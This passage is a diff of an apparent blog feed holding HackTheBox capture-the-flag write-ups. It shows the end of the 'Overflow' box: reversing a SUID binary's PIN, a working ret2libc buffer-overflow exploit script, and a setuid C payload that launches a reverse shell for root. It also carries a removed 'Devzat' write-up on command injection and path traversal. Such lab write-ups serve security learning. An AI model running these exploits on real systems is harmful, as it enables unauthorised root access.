+│           0x56602ab7      e864fcffff     call sym.__x86.get_pc_thunk.bx                                                             
+│           0x56602abc      81c3e4240000   add ebx, 0x24e4
+│           0x56602ac2      e8e9fbffff     call sym.imp.rand           ; int rand(void)                                               
+│           0x56602ac7      8945f4         mov dword [ebp - 0xc], eax                                                                 
+│           0x56602aca      83ec0c         sub esp, 0xc                                                                               
+│           0x56602acd      ff75f4         push dword [ebp - 0xc]                                                                     
+│           0x56602ad0      e848fdffff     call sym.random             ; uint32_t random(void)                                        
+│           0x56602ad5      83c410         add esp, 0x10
+│           0x56602ad8      8945f0         mov dword [ebp - 0x10], eax                                                                
+│           0x56602adb      83ec08         sub esp, 8
+│           0x56602ade      ff75f4         push dword [ebp - 0xc]
+│           0x56602ae1      8d8358ddffff   lea eax, [ebx - 0x22a8]                                                                    
+│           0x56602ae7      50             push eax                    ; const char *format                                           
+│           0x56602ae8      e8f3faffff     call sym.imp.printf         ; int printf(const char *format)                               
+│           0x56602aed      83c410         add esp, 0x10
+│           0x56602af0      83ec08         sub esp, 8
+│           0x56602af3      8d45ec         lea eax, [ebp - 0x14]
+│           0x56602af6      50             push eax
+│           0x56602af7      8d837dddffff   lea eax, [ebx - 0x2283]
+│           0x56602afd      50             push eax                    ; const char *format
+│           0x56602afe      e8bdfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
+│           0x56602b03      83c410         add esp, 0x10
+│           0x56602b06      8b45ec         mov eax, dword [ebp - 0x14]
+│           0x56602b09      3945f0         cmp dword [ebp - 0x10], eax
+│       ╭─&lt; 0x56602b0c      753c           jne 0x56602b4a
+│       │   0x56602b0e      83ec0c         sub esp, 0xc
+│       │   0x56602b11      8d8380ddffff   lea eax, [ebx - 0x2280]
+│       │   0x56602b17      50             push eax                    ; const char *format
+│       │   0x56602b18      e8c3faffff     call sym.imp.printf         ; int printf(const char *format)
+│       │   0x56602b1d      83c410         add esp, 0x10
+│       │   0x56602b20      83ec08         sub esp, 8
+│       │   0x56602b23      8d45d8         lea eax, [ebp - 0x28]
+│       │   0x56602b26      50             push eax
+│       │   0x56602b27      8d83c3dcffff   lea eax, [ebx - 0x233d]
+│       │   0x56602b2d      50             push eax                    ; const char *format
+│       │   0x56602b2e      e88dfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
+│       │   0x56602b33      83c410         add esp, 0x10
+│       │   0x56602b36      83ec0c         sub esp, 0xc
+│       │   0x56602b39      8d8388ddffff   lea eax, [ebx - 0x2278]
+│       │   0x56602b3f      50             push eax                    ; const char *s
+│       │   0x56602b40      e8fbfaffff     call sym.imp.puts           ; int puts(const char *s)
+│       │   0x56602b45      83c410         add esp, 0x10
+│      ╭──&lt; 0x56602b48      eb12           jmp 0x56602b5c
+│      ││   ; CODE XREF from sym.check_pin @ 0x56602b0c
+│      │╰─&gt; 0x56602b4a      83ec0c         sub esp, 0xc
+│      │    0x56602b4d      8d83e3ddffff   lea eax, [ebx - 0x221d]
+│      │    0x56602b53      50             push eax                    ; const char *s
+│      │    0x56602b54      e8e7faffff     call sym.imp.puts           ; int puts(const char *s)
+│      │    0x56602b59      83c410         add esp, 0x10
+│      │    ; CODE XREF from sym.check_pin @ 0x56602b48
+│      ╰──&gt; 0x56602b5c      90             nop
+│           0x56602b5d      8b5dfc         mov ebx, dword [ebp - 4]
+│           0x56602b60      c9             leave
+╰           0x56602b61      c3             ret
+[0x56602ab0]&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>There are multiple calls to <code class="language-plaintext highlighter-rouge">scanf()</code>, which is used to read input from the user. So I opened the binary in debug mode and set a breakpoint after the first call to <code class="language-plaintext highlighter-rouge">scanf()</code> at <code class="language-plaintext highlighter-rouge">0x56635b03</code>. The instruction at <code class="language-plaintext highlighter-rouge">0x56635b09</code> compares the value of <code class="language-plaintext highlighter-rouge">eax</code> (which is where the PIN we entered is stored), with the value in <code class="language-plaintext highlighter-rouge">var_10h</code> (<code class="language-plaintext highlighter-rouge">ebp - 0x10</code>);</p>
+
+<p><img src="/assets/img/20220223104118.png" alt="" /></p>
+
+<p>Since the comparison is with <code class="language-plaintext highlighter-rouge">eax</code>, which is a 32 bit register, I read 4 bytes from the other operand, which gave <code class="language-plaintext highlighter-rouge">0xf3e6d338</code>. Converting this to 32 bit signed integer, I got <code class="language-plaintext highlighter-rouge">-202976456</code>;</p>
+
+<p><img src="/assets/img/20220223104835.png" alt="" /></p>
+
+<p>This value is the valid PIN, and it was accepted by the binary;</p>
+
+<p><img src="/assets/img/20220223105044.png" alt="" /></p>
+
+<p>After that, we were prompted for a name, and the program printed out a message, and then exit. The way the program reads the <strong>name</strong> could be vulnerable to <em>buffer overflow</em>. The name read is stored at <code class="language-plaintext highlighter-rouge">var_28h</code> (<code class="language-plaintext highlighter-rouge">ebp - 0x28</code>);</p>
+
+<p><img src="/assets/img/20220223111120.png" alt="" /></p>
+
+<p>A memory address in x86 is 32 bit. Since the destination address is 40 bytes (<code class="language-plaintext highlighter-rouge">0x28</code>) bytes away from the base of the stack frame (EBP), we will be able to overwrite the saved EBP of <code class="language-plaintext highlighter-rouge">main()</code> (the caller) after writing 40 bytes, and the EIP after 44 bytes. Testing this in <code class="language-plaintext highlighter-rouge">gdb</code>, it worked as expected. The binary is vulnerable to <em>buffer overflow</em> attack;</p>
+
+<p><img src="/assets/img/20220223111853.png" alt="" /></p>
+
+<p>And it gets better too, because ASLR is disabled on the box;</p>
+
+<p><img src="/assets/img/20220223203858.png" alt="" /></p>
+
+<p><br /></p>
+
+<h4 id="exploitation-ret2libc">Exploitation: ret2libc</h4>
+<p><br /></p>
+
+<p>The binary has a non-executable stack (NX/DEP), so this won’t be as simple as loading shellcode into the stack, and jumping to it. An exploitation technique that can be used to get around this is <strong>return to libc</strong> (ret2libc) attack. This attack works by overwriting the EIP with the address of a function in the libc library (like <code class="language-plaintext highlighter-rouge">system</code> or <code class="language-plaintext highlighter-rouge">execv</code>), and passing it an argument we control (like the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> string in the libc library). This works because no code is executed on the stack.</p>
+
+<p>To exploit this, I need to write <strong>44</strong> bytes of padding, followed by the address of <code class="language-plaintext highlighter-rouge">execv()</code> to overwrite the EIP. followed by the address of <code class="language-plaintext highlighter-rouge">exit()</code> which will be the return address for clean exit, and then followed by the address of a string containing the full path of the binary I wished to execute. I used <code class="language-plaintext highlighter-rouge">execv()</code> because unlike <code class="language-plaintext highlighter-rouge">system()</code>, it does not drop privileges when spawning a new process.</p>
+
+<p>The first step is figuring out the address of <code class="language-plaintext highlighter-rouge">execv()</code>, <code class="language-plaintext highlighter-rouge">exit()</code>, and the environment variable <code class="language-plaintext highlighter-rouge">PAYLOAD</code> (which I set to the path of my reverse shell). For this, I wrote a simple C program;</p>
+
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(){
+
+  printf("Addr of system():   0x%08x\n", &amp;execv);
+  printf("Addr of exit():     0x%08x\n", &amp;exit);
+  printf("Addr of $PAYLOAD:   0x%08x\n", getenv("PAYLOAD"));
+  
+  return 0;
+}
+</code></pre>
+
+<p>Notice how the address of <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> changes based on the length of the filename;</p>
+
+<p><img src="/assets/img/20220225070759.png" alt="" /></p>
+
+<p>We need to account for this when calling the binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code>. Since it is 30 characters long, I renamed the address dumper to <code class="language-plaintext highlighter-rouge">/dev/shm/dump_addrssssssssssss</code>. This will give me the correct address of <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> when calling <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code>. We now have our valid addresses;</p>
+
+<p><img src="/assets/img/20220225070932.png" alt="" /></p>
+
+<p>Using python, I built a simple <em>ret2libc</em> payload;</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python2
+</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="nb">buffer</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">44</span>
+
+<span class="n">execv</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xf7ea8730</span><span class="p">)</span>
+<span class="nb">exit</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xf7e194b0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xffffdf44</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"-202976456"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">execv</span> <span class="o">+</span> <span class="nb">exit</span> <span class="o">+</span> <span class="n">payload</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I generated the buffer and saved it in my web directory;</p>
+
+<p><img src="/assets/img/20220225071253.png" alt="" /></p>
+
+<p>On the remote host, I set <code class="language-plaintext highlighter-rouge">PAYLOAD</code> to <code class="language-plaintext highlighter-rouge">/dev/shm/payload</code>, where payload is a shell script containing a simple bash reverse shell. The exploit worked, but I got a shell as my current user. The privileges were dropped;</p>
+
+<p><img src="/assets/img/20220225071317.png" alt="" /></p>
+
+<p><img src="/assets/img/20220225071333.png" alt="" /></p>
+
+<p>So I wrote a simple C payload that will elevate to higher privileges using <code class="language-plaintext highlighter-rouge">setuid()</code> and <code class="language-plaintext highlighter-rouge">setgid()</code> before calling my reverse shell;</p>
+
+<pre><code class="language-C">#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(){
+
+  setuid(0);
+  setgid(0);
+  char *args[] = {"revshell.sh", NULL};
+  execv("/dev/shm/revshell.sh", args);
+  return 0;
+}
+</code></pre>
+
+<p>I compiled and pushed the program to <code class="language-plaintext highlighter-rouge">/dev/shm/payload</code>, which is the value in my <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> variable. Running the exploit again, I got a shell on the box as <strong>root</strong>;</p>
+
+<p><img src="/assets/img/20220225072928.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="summary">Summary</h3>
+<p><br /></p>
+
+<ul>
+  <li>Discovered port <strong>22</strong>, <strong>25</strong>, and <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
+  <li>Found an open signup on the website, and created a test account.</li>
+  <li>Identified a possible username <strong>admin</strong> that exist on the website.</li>
+  <li>Used <em>Oracle Padding</em> attack to craft a cookie that gave access to the account of <strong>admin</strong>
+    <ul>
+      <li>Found an SQL injection vulnerability in <code class="language-plaintext highlighter-rouge">/home/logs.php</code></li>
+      <li>Used <code class="language-plaintext highlighter-rouge">sqlmap</code> to dump some hashes, and discovered the domain <strong>devbuild-job.overflow.htb</strong></li>
+      <li>Gained access to the domain by cracking the salted hash of the user <strong>editor</strong></li>
+    </ul>
+  </li>
+  <li><strong>devbuild-job.overflow.htb</strong>
+    <ul>
+      <li>Found a file upload form that is passed to <code class="language-plaintext highlighter-rouge">exiftool</code>.</li>
+      <li>Exploited <strong>CVE-2021-22204</strong> to gain code execution as <strong>www-data</strong></li>
+    </ul>
+  </li>
+  <li>Inside as <strong>www-data</strong>
+    <ul>
+      <li>Found 2 local users; <strong>developer</strong>, and <strong>tester</strong> (holds <code class="language-plaintext highlighter-rouge">user.txt</code>)</li>
+      <li>Recovered MySQL credentials in config files of <strong>devbuild-job.overflow.htb</strong> domain.</li>
+      <li>Gained access to account of <strong>developer</strong> due to password reuse.</li>
+    </ul>
+  </li>
+  <li>Inside as <strong>developer</strong>
+    <ul>
+      <li>Identified a write access to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></li>
+      <li><code class="language-plaintext highlighter-rouge">pspy</code> showed requests to <code class="language-plaintext highlighter-rouge">http://taskmanage.overflow.htb/task.sh</code>, which I hijacked by editing the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to gain code execution as <strong>tester</strong></li>
+    </ul>
+  </li>
+  <li>Inside as <strong>tester</strong>
+    <ul>
+      <li>Found a SUID binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code></li>
+      <li>Binary is protected by a PIN.</li>
+      <li>Reversed the binary using <code class="language-plaintext highlighter-rouge">radare2</code> to extract the PIN.</li>
+      <li>Identified a <em>buffer overflow</em> vulnerability in the binary.</li>
+      <li>Performed a <em>ret2libc</em> attack to gain code execution as <strong>root</strong></li>
+    </ul>
+  </li>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="hard" /><category term="web" /><category term="smtp" /><category term="oracle padding" /><category term="padbuster" /><category term="execute after redirect" /><category term="sql injection" /><category term="sqlmap" /><category term="john" /><category term="python" /><category term="exiftool" /><category term="reverse engineering" /><category term="binary exploitation" /><category term="ret2libc" /><category term="nx" /><category term="radare2" /><summary type="html"><![CDATA[Overflow is an amazing hard-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an oracle padding vulnerability to gain access to an admin dashboard that’s vulnerable to SQL injection, use the SQL injection to retrieve and crack a hash for another domain, which is vulnerable to an exiftool RCE.]]></summary></entry><entry><title type="html">Shibboleth - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html" rel="alternate" type="text/html" title="Shibboleth - HackTheBox" /><published>2022-04-02T00:00:00+01:00</published><updated>2022-04-02T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/shibboleth</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html"><![CDATA[<p><strong>Shibboleth</strong> is a relatively easy medium linux box. It’s running an instance of <em>Zabbix</em> which you can identify by bruteforcing for hidden subdomains. Once discovered, you need to exploit an ASF-RMCP/IPMI service running on UDP port <strong>623</strong> to extract and crack the hash of an administrator, which will give you access to the Zabbix dashboard. The box itself is configured as a Zabbix agent, so you can use this to gain code execution. Once inside, you will be moving laterally to another user through password reuse, and gain root access to the box thanks to a vulnerable MySQL service.</p>
 
 <p><br /></p>
 
@@ -1223,241 +2129,4 @@ Service detection performed. Please report any incorrect results at https://nmap
       <li>Retrieved the SSH key in the crash file using <code class="language-plaintext highlighter-rouge">apport-unpack</code> and <code class="language-plaintext highlighter-rouge">strings</code>, and gained root access to the box over SSH.</li>
     </ul>
   </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="api" /><category term="nodejs" /><category term="static analysis" /><category term="git" /><category term="jwt" /><category term="command injection" /><category term="information disclosure" /><category term="tunneling" /><category term="apport" /><category term="custom exploitation" /><summary type="html"><![CDATA[Secret is an easy linux box where you have to exploit a sensitive information leak in a git repo to recover a JWT secret, which allows you to forge a JWT token that gives you access to an API endpoint that’s vulnerable to command injection. Once on the box, you will be exploiting a custom SUID binary that allows for core dumping.]]></summary></entry><entry><title type="html">Devzat - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/devzat.html" rel="alternate" type="text/html" title="Devzat - HackTheBox" /><published>2022-03-12T00:00:00+01:00</published><updated>2022-03-12T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/devzat</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/devzat.html"><![CDATA[<p><strong>Devzat</strong> is a pretty easy <em>medium</em> linux box. It starts with a website that inform you about a chat service on the host accessible on port <strong>8000</strong>. Some enumeration will yield a hidden subdomain that’s vulnerable to <em>command injection</em>. Once inside the box, there is an instance of <em>InfluxDB</em> running locally that’s vulnerable to <strong>CVE-2019-20933</strong>, which you can use to gain access to the box as another local user. Privesc involves exploiting a <em>path traversal</em> flaw in a custom code.</p>
-
-<p><br /></p>
-
-<h3 id="info">Info</h3>
-<p><br /></p>
-
-<p><img src="/assets/img/20211017084731.png" alt="" /></p>
-
-<p><img src="/assets/img/20211017084810.png" alt="" />
-<br /></p>
-
-<hr />
-<h3 id="recon">Recon</h3>
-<p><br /></p>
-
-<h4 id="nmap">NMAP</h4>
-
-<pre><code class="language-raw"># Nmap 7.70 scan initiated Sun Oct 17 08:49:05 2021 as: nmap -sV -sC -oN nmap.txt 10.10.11.118
-Nmap scan report for 10.10.11.118
-Host is up (0.23s latency).
-Not shown: 997 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
-80/tcp   open  http    Apache httpd 2.4.41
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Did not follow redirect to http://devzat.htb/
-8000/tcp open  ssh     (protocol 2.0)
-| fingerprint-strings: 
-|   NULL: 
-|_    SSH-2.0-Go
-| ssh-hostkey: 
-|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port8000-TCP:V=7.70%I=7%D=10/17%Time=616BD594%P=x86_64-pc-linux-gnu%r(N
-SF:ULL,C,"SSH-2\.0-Go\r\n");
-Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sun Oct 17 08:50:17 2021 -- 1 IP address (1 host up) scanned in 71.63 seconds
-</code></pre>
-<p><br /></p>
-
-<h3 id="web">Web</h3>
-
-<p><img src="/assets/img/20211017085159.png" alt="" /></p>
-
-<p><img src="/assets/img/20211017085740.png" alt="" /></p>
-
-<p>Possible username <code class="language-plaintext highlighter-rouge">patrick</code>?</p>
-
-<p><img src="/assets/img/20211017085822.png" alt="" /></p>
-
-<p>Connecting to the SSH service on port <strong>8000</strong> gave the below output;</p>
-
-<p><img src="/assets/img/20211017090318.png" alt="" /></p>
-
-<p><img src="/assets/img/20211017090432.png" alt="" /></p>
-
-<p>Attempts to log in as the user <em>patrick</em> kept failing, saying it’s reserved for local use. This may be because the user <em>patrick</em> is the admin.</p>
-
-<p>Bruteforcing virtual hosts using <code class="language-plaintext highlighter-rouge">ffuf</code> discovered one;</p>
-
-<p><img src="/assets/img/20211017092446.png" alt="" />
-<br /></p>
-
-<hr />
-<h3 id="pets">Pets</h3>
-<p><br /></p>
-
-<p><img src="/assets/img/20211017092715.png" alt="" /></p>
-
-<p><img src="/assets/img/20211017092740.png" alt="" /></p>
-
-<p>The add pet form above is used to add an entry to the pets list. Adding a pet generated the request;</p>
-
-<p><img src="/assets/img/20211017093153.png" alt="" /></p>
-
-<p>Bruteforcing the web root with <code class="language-plaintext highlighter-rouge">ffuf</code> kept giving <strong>200</strong> responses, even for invalid paths. Viewing the page source showed it is dynamically generated by a JavaScript code;</p>
-
-<p><img src="/assets/img/20211017093348.png" alt="" /></p>
-
-<p>So I downloaded the file and parsed it with <code class="language-plaintext highlighter-rouge">js-beautify</code> for easier analysis. I found the block of code that generates the request used for adding pets, and nothing more of interest;</p>
-
-<p><img src="/assets/img/20211017094040.png" alt="" /></p>
-
-<p>Newly added pet entries can be seen immediately after they have been added, but refreshing the page makes them disappear.
-<br /></p>
-
-<h4 id="fuzzing-the-json-data">Fuzzing the JSON data</h4>
-<p><br /></p>
-
-<p>Deleting all the parameters doesn’t have any visible effect on the parser at first, and the web app responded with <strong>Pet was added successfully</strong>. Breaking the JSON syntax produced an error message;</p>
-
-<p><img src="/assets/img/20211017095228.png" alt="" /></p>
-
-<p>Sometimes even after getting a success message from the POST request, reloading the JSON data does not show the new pet entry. However, after submitting only the <code class="language-plaintext highlighter-rouge">name</code> parameter, reloading the pets JSON data by sending GET request to <code class="language-plaintext highlighter-rouge">/api/pet</code> showed a new response;</p>
-
-<p><img src="/assets/img/20211017102637.png" alt="" /></p>
-
-<p>The <code class="language-plaintext highlighter-rouge">species</code> parameter is not being returned in the JSON data of the pets, but appears to be used to construct the <code class="language-plaintext highlighter-rouge">characteristics</code> parameter that describes the species. I assumed it’s being used to load the characteristics data, which will make it an interesting target for injection attacks like LFI and SQLi.</p>
-
-<p>After adding a <code class="language-plaintext highlighter-rouge">characteristics</code> parameter in the submitted JSON, it is overwritten in the JSON response obtained if the value given to the <code class="language-plaintext highlighter-rouge">species</code> parameter is valid (e.g: <code class="language-plaintext highlighter-rouge">cat</code>), but if it is not valid, the <code class="language-plaintext highlighter-rouge">characteristics</code> parameter in the JSON response gets set to <code class="language-plaintext highlighter-rouge">exit status 1</code>.</p>
-
-<p>The message <code class="language-plaintext highlighter-rouge">exit status 1</code> is very interesting because that is usually the result of a function call or some system command. Return codes that are not equal to <code class="language-plaintext highlighter-rouge">0</code> usually indicate an error. So I started fuzzing the <code class="language-plaintext highlighter-rouge">species</code> and <code class="language-plaintext highlighter-rouge">characteristics</code> parameters for <em>Command Injection</em> flaws, and caught a break. The parameter <code class="language-plaintext highlighter-rouge">species</code> is vulnerable to command injection;</p>
-
-<p><img src="/assets/img/20211017110307.png" alt="" /></p>
-
-<p><img src="/assets/img/20211017110358.png" alt="" /></p>
-
-<p>I then exploited the command injection to gain access to the box as the user <code class="language-plaintext highlighter-rouge">patrick</code>;</p>
-
-<p><img src="/assets/img/20211017110726.png" alt="" /></p>
-
-<p>Going through the source code of the web app at <code class="language-plaintext highlighter-rouge">/home/patrick/pets</code>, I found the vulnerable code that let me in;</p>
-
-<p><img src="/assets/img/20211017111317.png" alt="" /></p>
-
-<p>It looks like the code is also vulnerable to <em>local file inclusion (LFI)</em>.</p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="user">User</h3>
-<p><br /></p>
-
-<p>The user <code class="language-plaintext highlighter-rouge">patrick</code> does not have the user flag, but it was found in the home of <code class="language-plaintext highlighter-rouge">catherine</code>.</p>
-
-<p>Inside the home directory of <em>patrick</em>, source code for the web apps were found, including a binary named <code class="language-plaintext highlighter-rouge">petshop</code> in the <code class="language-plaintext highlighter-rouge">~/pets</code> directory.</p>
-
-<p>Using <code class="language-plaintext highlighter-rouge">linPEAS</code> and manual enumeration didn’t yield anything interesting. <code class="language-plaintext highlighter-rouge">netstat</code> idenitified a bunch of locally running services, so I setup some SSH tunnels so I can scan them from my box;</p>
-
-<p><img src="/assets/img/20211019010046.png" alt="" /></p>
-
-<p>I then ran an <code class="language-plaintext highlighter-rouge">nmap</code> scan on the ports to identify the services they are running;</p>
-
-<pre><code class="language-raw"># Nmap 7.70 scan initiated Tue Oct 19 01:02:17 2021 as: nmap -sV -p6010,8443,53,8086 -oN nmap-hidden.txt localhost
-Nmap scan report for localhost (127.0.0.1)
-Host is up (0.00023s latency).
-Other addresses for localhost (not scanned): ::1
-
-PORT     STATE  SERVICE VERSION
-53/tcp   closed domain
-6010/tcp open   x11?
-8086/tcp open   http    InfluxDB http admin 1.7.5
-8443/tcp open   ssh     (protocol 2.0)
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port8443-TCP:V=7.70%I=7%D=10/19%Time=616E0B10%P=x86_64-pc-linux-gnu%r(N
-SF:ULL,C,"SSH-2\.0-Go\r\n");
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Tue Oct 19 01:03:12 2021 -- 1 IP address (1 host up) scanned in 55.43 seconds
-</code></pre>
-
-<p>The service on port <strong>8086</strong> has been identified as a HTTP service, and viewing it in a browser just give a <strong>404 Not found</strong>. Bruteforcing with <strong>ffuf</strong> found a few paths;</p>
-
-<p><img src="/assets/img/20211019010801.png" alt="" /></p>
-
-<p>Going to the <code class="language-plaintext highlighter-rouge">/query</code> path gave an authentication prompt;</p>
-
-<p><img src="/assets/img/20211019011007.png" alt="" /></p>
-
-<p>Googling showed that the version of <strong>InfluxDB</strong> on the host is vulnerable to authentication bypass, and was exploited using a python code obtained from the repo https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</p>
-
-<p><img src="/assets/img/20211019014045.png" alt="" /></p>
-
-<p><em>InfluxDB</em> is something I have never came across before, so I had to do a lot of googling to learn about it. Using a cheatsheet I found on <em>GitHub</em> at https://gist.github.com/tomazursic/6cc217e2644c619ceceefb8ce824925b, I was able to enumerate the service and found a hash for the user <code class="language-plaintext highlighter-rouge">catherine</code> in the <strong>devzat</strong> database inside the <strong>user</strong> measurement;</p>
-
-<p><img src="/assets/img/20211019165251.png" alt="" /></p>
-
-<p><img src="/assets/img/20211019165415.png" alt="" /></p>
-
-<p>The password <code class="language-plaintext highlighter-rouge">woBeeYareedahc7Oogeephies7Aiseci</code> does not appear to be a hash, so I just used to access the account of <em>catherine</em> on the host, and it worked;</p>
-
-<p><img src="/assets/img/20211019165646.png" alt="" />
-<br /></p>
-
-<hr />
-<h3 id="privesc">PrivEsc</h3>
-<p><br /></p>
-
-<p>The user <em>catherine</em> does not have permission to run any command on the host using <code class="language-plaintext highlighter-rouge">sudo</code>. No files of interest were found in her home directory, so I ran <code class="language-plaintext highlighter-rouge">linPEAS</code> again in hope of finding something new, but it didn’t.</p>
-
-<p>Inside <code class="language-plaintext highlighter-rouge">/var/backups</code>, 2 backup files belonging to <em>catherine</em> were found. The files were extracted, but nothing of interest was found inside at a quick glance;</p>
-
-<p><img src="/assets/img/20211019172320.png" alt="" /></p>
-
-<p>Connecting to the SSH chat service locally on port <strong>8443</strong> as <em>catherine</em> showed some interesting messages from <em>patrick</em>;</p>
-
-<p><img src="/assets/img/20211019214956.png" alt="" /></p>
-
-<p>Since the default backups directory in linux is <code class="language-plaintext highlighter-rouge">/var/backups</code>, and the only files of interest in the directory are the previously discovered <em>.zip</em> files, I extracted them again to <code class="language-plaintext highlighter-rouge">/dev/shm</code>, and run the <code class="language-plaintext highlighter-rouge">diff</code> command on their extracted files, and found a password <code class="language-plaintext highlighter-rouge">CeilingCatStillAThingIn2021?</code>;</p>
-
-<p><img src="/assets/img/20211019215441.png" alt="" /></p>
-
-<p>Attempt to login as the root user using the password failed. In the text messages <em>patrick</em> talked about implementing a new feature that requires a password, so I continue to examine the output generated by the <code class="language-plaintext highlighter-rouge">diff</code> command, and noticed a function that appears to be used to read files from disk provided a path and a valid password were provided;</p>
-
-<p><img src="/assets/img/20211019220815.png" alt="" /></p>
-
-<p>So I logged back into the chat app as <em>catherine</em> and listed available commands using the <code class="language-plaintext highlighter-rouge">/help</code> command. One entry stood out;</p>
-
-<p><img src="/assets/img/20211019220941.png" alt="" /></p>
-
-<p>This is likely the command used to invoke the function used to read files using a path and a password. So I tried to read the file <code class="language-plaintext highlighter-rouge">/etc/hostname</code> to see if it works, which did not work because the application is prefixing <code class="language-plaintext highlighter-rouge">/root/devzat</code> to the filename given, as indicated by the error message. Using a simple path traversal payload, I was able to read the SSH key file of the <code class="language-plaintext highlighter-rouge">root</code> user;</p>
-
-<p><img src="/assets/img/20211019221352.png" alt="" /></p>
-
-<p>I copied the SSH key to my attack box, and used it to access the box as the <code class="language-plaintext highlighter-rouge">root</code> user over SSH;</p>
-
-<p><img src="/assets/img/20211019221510.png" alt="" />
-<br /></p>
-
-<hr />
-<h3 id="summary">Summary</h3>
-<p><br /></p>
-
-<ul>
-  <li>Identified services running on the host using <code class="language-plaintext highlighter-rouge">nmap</code></li>
-  <li>Found the username <strong>patrick</strong> on the web page, which is not allowed to be used remotely on the SSH chat service.</li>
-  <li>Found a hidden subdomain <strong>pets.devzat.htb</strong> using <code class="language-plaintext highlighter-rouge">ffuf</code>
-    <ul>
-      <li>Fuzzing the JSON data submitted to the web app via POST request uncovered a <em>command injection</em> flaw, which was exploited to gain access to the box as the user <strong>patrick</strong>.</li>
-    </ul>
-  </li>
-  <li>Inside the box as <strong>patrick</strong>;
-    <ul>
-      <li>Identified another user named <strong>catherine</strong>.</li>
-      <li>Discovered a local installation of <em>InfluxDB</em> that is vulnerable to authentication bypass, and was enumerated to obtain a password that gave access to the account of <strong>catherine</strong>.</li>
-    </ul>
-  </li>
-  <li>Inside the box as <strong>catherine</strong>;
-    <ul>
-      <li>Connected to the local SSH chat service on port <strong>8443</strong> as <strong>catherine</strong>.</li>
-      <li>Received a chat log between <strong>patrick</strong> and <strong>catherine</strong> discussing a new feature that is password-protected, with the password obtainable from backup files in the default linux backups directory.</li>
-      <li>Located the password inside the backups and used it to access the feature, which is used to read files from disk. I used it to load the SSH private key of the root user.</li>
-    </ul>
-  </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="cve" /><category term="command injection" /><category term="influxdb" /><category term="path traversal" /><category term="tunneling" /><category term="custom exploitation" /><summary type="html"><![CDATA[Devzat is a pretty easy medium linux box. It starts with a website that inform you about a chat service on the host accessible on port 8000. Some enumeration will yield a hidden subdomain that’s vulnerable to command injection. Once inside the box, there is an instance of InfluxDB running locally that’s vulnerable to CVE-2019-20933, which you can use to gain access to the box as another local user. Privesc involves exploiting a path traversal flaw in a custom code.]]></summary></entry></feed>
